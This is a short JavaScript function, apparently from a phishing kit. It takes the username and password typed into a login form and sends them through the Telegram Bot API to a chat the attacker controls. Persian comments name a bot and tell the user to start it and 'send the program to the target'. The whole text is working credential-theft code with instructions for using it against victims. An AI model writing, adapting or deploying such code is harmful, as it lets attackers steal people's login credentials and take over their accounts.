function SendData() {
    var user = document.getElementById("userlog").value;
    var pass = document.getElementById("passlog").value;
    var userpass = "Username:"+user+"_"+"Password:"+pass
    // Id Bot:@mahantesttest_bot
    // Run:
    // اول وارد تلگرام شوید و ایدی که بالا نوشتم را در سرچ پیست کنید
    // بعد ربات را استارت کنید وبرنامه را برای تارگت ارسال کنید

    var url = 'https://api.telegram.org/bot{tocken}/sendmessage?chat_id={yourchatidintelegram}&text='+userpass;

    
    var send = new XMLHttpRequest();
    send.open("GET", url, true);
    send.send();

    
}